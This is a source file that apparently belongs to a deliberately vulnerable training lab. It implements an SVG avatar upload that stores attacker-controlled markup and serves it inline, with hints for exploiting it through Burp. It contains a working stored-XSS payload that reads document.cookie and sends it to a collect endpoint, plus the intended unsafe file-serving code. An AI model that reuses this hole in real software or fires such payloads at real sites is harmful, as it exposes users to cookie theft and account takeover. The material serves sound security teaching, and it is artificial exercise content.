'use strict';
// Stored XSS via SVG upload: uploaded SVG is served inline as image/svg+xml.
const express = require('express');
const fs = require('fs');
const path = require('path');
const { DB_PATH } = require('../../../lib/db');
const { page, esc, errorPage, claimBox, fixCta } = require('../../../lib/page');
const { xssNonce, xssNonceTag, siteFrame, backLinks } = require('../shared');
const { tokenShareParams, COMBINE_FROM_SEARCH_JS } = require('../../../lib/jstoken');

const router = express.Router();

// Uploads live beside the database (the writable data directory), never in the source tree.
const UPLOAD_DIR = path.join(path.dirname(DB_PATH), 'xss-uploads');
function ensureUploadDir() {
  fs.mkdirSync(UPLOAD_DIR, { recursive: true });
}

const SVG_PAYLOAD = "<svg xmlns=\"http://www.w3.org/2000/svg\"><script><![CDATA[fetch('/xss/collect?c='+document.cookie+'&v=xss-svg-upload&n='+(" + COMBINE_FROM_SEARCH_JS + "))]]></script></svg>";

router.get('/svg', (req, res) => {
  let files = [];
  try {
    files = fs.readdirSync(UPLOAD_DIR)
      .filter((f) => f.endsWith('.svg'))
      .map((f) => ({ f, t: fs.statSync(path.join(UPLOAD_DIR, f)).mtimeMs }))
      .sort((a, b) => b.t - a.t)
      .slice(0, 20);
  } catch (e) { /* no uploads yet */ }
  // The uploaded SVG opens as its own document, so it cannot see window.__px.
  // The file links carry the token's two share values in the query string
  // instead of the raw token, and the payload combines them at runtime when
  // it executes.
  const svgShares = tokenShareParams(xssNonce(req, 'xss-svg-upload'));
  const rows = files.map(({ f, t }) => `<tr>
      <td>${esc(f)}</td><td>${esc(new Date(t).toISOString().slice(0, 16).replace('T', ' '))}</td>
      <td><a href="/xss/uploads/${esc(f)}?pxa=${svgShares.pxa}&pxk=${svgShares.pxk}">Open</a></td></tr>`).join('');
  const list = rows
    ? `<div class="tbl-scroll"><table class="tbl">
        <caption class="sr-only">Uploaded avatars</caption>
        <thead><tr><th scope="col">File</th><th scope="col">Uploaded (UTC)</th><th scope="col">Link</th></tr></thead>
        <tbody>${rows}</tbody></table></div>`
    : '<p class="dim">No avatars uploaded yet.</p>';
  res.send(page('Avatars Â· Pixelpond', `
    <h2>Pixelpond</h2>
    ${xssNonceTag(req, 'xss-svg-upload')}
    ${siteFrame('Pixelpond', ['Gallery', 'Avatars', 'Settings'], `
      <p>Upload a vector avatar. Paste your SVG markup, we store it and serve it back as <code>image/svg+xml</code>.</p>
      <form method="POST" action="/xss/svg">
        <div class="clay-field">
          <label for="name">File name</label>
          <input class="clay-input" type="text" id="name" name="name" placeholder="avatar" maxlength="32" autocomplete="off">
        </div>
        <div class="clay-field">
          <label for="svg">SVG markup</label>
          <textarea class="clay-input" id="svg" name="svg" rows="8" placeholder="&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;...&lt;/svg&gt;" required></textarea>
        </div>
        <button class="clay-btn clay-btn-primary" type="submit">Upload SVG</button>
      </form>
      <h3>Recent avatars</h3>
      ${list}`)}
    ${claimBox({ vulnId: 'xss-svg-upload', payload: esc(SVG_PAYLOAD), statusUrl: '/xss/claim-status?v=xss-svg-upload', beaconInfo: 'The SVG opens as its own document, so window.__px is not defined there. The file link carries the two share values of the token in ?pxa= and ?pxk=; your script must combine them at runtime (XOR the hex pairs) to rebuild the token, because the raw token is never written anywhere. The file is parsed as XML, so a bare &amp; in the script would break parsing: keep the code inside a CDATA section.' })}
    ${fixCta('xss', 'xss-svg-upload')}
    ${backLinks('xss-svg-upload')}
  `));
});

router.post('/svg', (req, res) => {
  const raw = String(req.body.svg || '').slice(0, 20000);
  const name = String(req.body.name || 'pic').replace(/[^a-z0-9_-]/gi, '').slice(0, 32) || 'pic';
  if (!/<svg[\s>]/i.test(raw)) {
    return res.status(400).send(page('Avatars Â· Pixelpond', errorPage(400, 'That is not SVG markup',
      '<p>The upload must contain an <code>&lt;svg&gt;</code> element.</p><p><a href="/xss/svg">Back to uploads</a></p>')));
  }
  const file = `${name}-${Date.now()}.svg`;
  ensureUploadDir();
  // VULN: attacker-controlled SVG is stored and served as image/svg+xml, so embedded scripts run on direct visit.
  fs.writeFileSync(path.join(UPLOAD_DIR, file), raw);
  const sp = tokenShareParams(xssNonce(req, 'xss-svg-upload'));
  res.redirect('/xss/uploads/' + file + '?pxa=' + sp.pxa + '&pxk=' + sp.pxk);
});

router.get('/uploads/:file', (req, res) => {
  const file = req.params.file;
  if (!/^[a-zA-Z0-9_-]+\.svg$/.test(file)) return res.status(400).send('bad filename');
  const full = path.join(UPLOAD_DIR, file);
  if (!full.startsWith(UPLOAD_DIR) || !fs.existsSync(full)) return res.status(404).send('not found');
  res.set('Content-Type', 'image/svg+xml');
  res.send(fs.readFileSync(full, 'utf8'));
});

module.exports = {
  vuln: {
    id: 'xss-svg-upload',
    name: 'Stored XSS via SVG Upload',
    difficulty: 'Medium',
    hint: 'Uploaded SVGs are served as image/svg+xml. An SVG is XML, and XML can carry a script tag that runs when the file is opened directly.',
    hints: [
      'Intercept the Upload SVG POST in Burp Proxy and send it to Repeater. The uploaded file is served back as image/svg+xml: what is an SVG file, really?',
      'SVG is XML, and XML can contain <script> tags. When the browser opens the uploaded SVG directly (not as an <img>), the script runs.',
      'In Repeater, upload an SVG whose <script> calls /xss/collect (parameters c, v=xss-svg-upload and n). The SVG is its own document, so rebuild the token at runtime from the pxa and pxk parameters of the file URL instead of window.__px, then open the file link in your proxied browser. Remember the SVG is parsed as XML: keep a bare & inside a CDATA section.',
    ],
    tools: 'BZ, B, C',
    how: 'In Burp, replay the Upload SVG POST in Repeater with a script-bearing SVG, then open the served file link in the proxied browser.',
    link: '/xss/svg',
    start: 'Start Burp Proxy, browse to /xss/svg in your proxied browser, and upload a plain SVG normally. Send the captured POST to Repeater: the svg field is a plain form parameter holding the whole SVG, so tweak it in Repeater, then open the served file link in the proxied browser to fire the beacon.',
  },
  router,
};
